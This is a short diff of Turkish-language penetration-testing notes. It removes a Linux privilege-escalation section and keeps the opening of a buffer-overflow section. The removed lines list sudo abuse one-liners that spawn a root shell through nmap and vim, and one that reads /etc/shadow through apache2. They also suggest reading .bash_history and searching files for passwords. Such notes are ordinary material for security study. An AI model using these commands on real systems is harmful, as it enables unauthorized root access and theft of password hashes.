@@ -1,19 +1,3 @@
-## PRIVILEGE ESCALATION ( YETKİ YÜKSELTME)
-
-### LINUX
-    1.	.bash_history dosyası okunarak önceden girilmiş komutlar incelenir.
-    2.	İçinde password geçen dosyalar find komutu ile taranır.
-    3.	sudo -l komutu ile yetkilere bakıldığında;
-    nmap:
-    sudo /usr/bin/nmap --interactive yazarak nmap komut satırına düşebiliriz.  !sh yazılır.
-    vim:
-    sudo /usr/bin/vim –c ‘!/bin/sh’
-    apache2:
-    sudo /usr/sbin/apache2 –f /etc/shadow    (shadow dosyasının içini okuma)
-    4.	
-
-### WINDOWS
-
 ## BUFFER OVERFLOW
 
     1.	Hedefe fazla veri göndererek çökertebiliyormuyuz dene.(pattern_create ile)
